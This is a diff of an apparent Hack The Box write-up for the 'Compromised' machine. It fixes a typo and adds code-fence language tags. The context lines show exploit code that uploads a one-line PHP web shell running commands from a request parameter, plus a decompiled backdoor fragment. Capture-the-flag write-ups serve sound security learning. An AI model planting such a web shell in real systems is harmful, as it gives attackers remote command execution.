@@ -15,7 +15,7 @@ tags: [htb-machines, htb, compromised]
 
 ---
 
-Compromised machine released on 12 Sep 2020 on Hackthebox and create by [D4nch3n](https://www.hackthebox.eu/home/users/profile/103781)
+Compromised machine released on 12 Sep 2020 on Hackthebox and created by [D4nch3n](https://www.hackthebox.eu/home/users/profile/103781)
 
 <span style="color:#ff5555">The blog is for educational purposes only.</span>
 
@@ -131,7 +131,7 @@ got noting we probably need to edit the script
 
 edit exploit code so we can see php version -
 
-```
+```py
 files = {
         'vqmod': (rand + ".php", "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>", "application/xml"),
         'token':one,
@@ -556,7 +556,7 @@ lets open it in ghidra
 
 /assets/img/htb-machines/compromised/
 
-````
+````cs
 
 if (iVar2 == 0) {
   backdoor._0_8_ = 0x4533557e656b6c7a;
